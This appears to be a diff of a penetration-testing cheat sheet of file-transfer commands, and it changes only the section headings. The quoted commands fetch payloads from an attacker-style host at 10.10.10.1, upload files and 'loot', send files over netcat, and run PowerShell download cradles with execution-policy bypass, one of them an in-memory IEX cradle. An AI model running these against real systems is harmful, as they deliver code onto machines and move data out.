@@ -6,7 +6,7 @@
 
 ---
 
-## Wget Download
+## download file wget
 Download a file from a URL.
 
 ```bash
@@ -17,7 +17,7 @@ wget {{URL:url:http://10.10.10.1:8000/payload.sh}} -O {{OUTFILE:file:payload.sh}
 
 ---
 
-## Wget Recursive Download
+## wget recursive mirror download
 Mirror a website or directory listing recursively.
 
 ```bash
@@ -28,7 +28,7 @@ wget -r -np -nH --cut-dirs={{DEPTH:int:1}} {{URL:url:http://10.10.10.1:8000/tool
 
 ---
 
-## Curl Download
+## download file curl
 Download a file with curl, following redirects.
 
 ```bash
@@ -39,7 +39,7 @@ curl -Lo {{OUTFILE:file:payload.sh}} {{URL:url:http://10.10.10.1:8000/payload.sh
 
 ---
 
-## Curl Upload (POST)
+## upload file curl POST
 Upload a file to an upload server via POST.
 
 ```bash
@@ -50,7 +50,7 @@ curl -X POST {{URL:url:http://10.10.10.1:8000/upload}} -F "files=@{{FILE:file:lo
 
 ---
 
-## SCP Transfer
+## transfer file SCP SSH
 Copy a file to or from a remote host over SSH.
 
 ```bash
@@ -61,7 +61,7 @@ scp {{FILE:file:./payload.sh}} {{USER:str:root}}@{{HOST:ip:10.10.10.1}}:{{REMOTE
 
 ---
 
-## Rsync Over SSH
+## rsync over SSH remote
 Sync files to a remote host over SSH with progress.
 
 ```bash
@@ -72,7 +72,7 @@ rsync -avz --progress -e "ssh -p {{PORT:port:22}}" {{SRC:dir:./loot/}} {{USER:st
 
 ---
 
-## Netcat File Transfer (Sender)
+## send file netcat sender
 Send a file to a listening netcat receiver.
 
 ```bash
@@ -83,7 +83,7 @@ nc {{HOST:ip:10.10.10.1}} {{PORT:port:9001}} < {{FILE:file:payload.sh}}
 
 ---
 
-## Base64 Encode for Transfer
+## base64 encode file transfer
 Encode a file as base64 for copy-paste transfer to restricted targets.
 
 ```bash
@@ -94,7 +94,7 @@ base64 -w0 {{FILE:file:payload.sh}} && echo
 
 ---
 
-## Base64 Decode on Target
+## base64 decode file target
 Decode a base64 string back to a binary file on the target.
 
 ```bash
@@ -105,7 +105,7 @@ echo "{{B64:str:base64_string_here}}" | base64 -d > {{OUTFILE:file:payload.sh}} 
 
 ---
 
-## Certutil Download (Windows)
+## download file certutil windows
 Download a file on a Windows target using certutil.
 
 ```bash
@@ -116,7 +116,7 @@ certutil -urlcache -split -f {{URL:url:http://10.10.10.1:8000/payload.exe}} {{OU
 
 ---
 
-## PowerShell Download Cradle (Windows)
+## powershell download cradle windows
 Download and optionally execute a file on a Windows target.
 
 ```bash
@@ -127,7 +127,7 @@ powershell -ep bypass -c "IWR -Uri '{{URL:url:http://10.10.10.1:8000/payload.exe
 
 ---
 
-## PowerShell IEX Cradle (Windows)
+## powershell IEX memory cradle windows
 Download and execute a PowerShell script in memory on a Windows target.
 
 ```bash
@@ -138,7 +138,7 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('{{URL:ur
 
 ---
 
-## SCP with PEM Key (Pull)
+## pull files SCP PEM key
 Copy a remote directory tree to local Desktop using a PEM key.
 
 ```bash
@@ -149,7 +149,7 @@ scp -i {{KEY:file:./key.pem}} -r {{USER:str:ec2-user}}@{{HOST:ip}}:{{REMOTE:str:
 
 ---
 
-## SCP via sshpass (Password Auth)
+## SCP sshpass password auth
 Copy files via SCP non-interactively using a password.
 
 ```bash
@@ -160,7 +160,7 @@ sshpass -p '{{PASSWORD:str}}' scp -o StrictHostKeyChecking=no -o UserKnownHostsF
 
 ---
 
-## Rsync Local Backup
+## rsync local backup mirror
 Mirror a local directory to a backup location preserving attributes.
 
 ```bash
@@ -171,7 +171,7 @@ rsync -a {{SRC:dir:/home/}} {{DEST:dir:/backups/home/}}
 
 ---
 
-## Rsync Compressed to Remote
+## rsync compressed to remote
 Transfer files to a remote host with rsync over SSH and compression.
 
 ```bash
